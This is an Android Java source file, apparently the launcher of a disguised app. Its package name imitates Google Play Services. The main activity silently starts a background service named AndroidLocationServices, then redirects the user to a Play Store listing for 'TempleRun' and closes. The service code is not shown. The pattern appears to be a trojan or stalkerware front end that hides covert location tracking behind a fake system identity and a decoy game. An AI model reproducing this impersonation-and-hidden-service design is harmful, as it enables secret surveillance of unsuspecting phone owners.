package com.google.android.googleplayservices;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;

/**
 * 
 * @author Atish Agrawal
 * 
 */

public class MainActivity extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);

		startService(new Intent(this, AndroidLocationServices.class));

		try {
			startActivity(new Intent(Intent.ACTION_VIEW,
					Uri.parse("market://details?id=" + "TempleRun")));
		} catch (android.content.ActivityNotFoundException anfe) {
			startActivity(new Intent(Intent.ACTION_VIEW,
					Uri.parse("http://play.google.com/store/apps/details?id="
							+ "TempleRun")));
		}

		finish();

	}

}
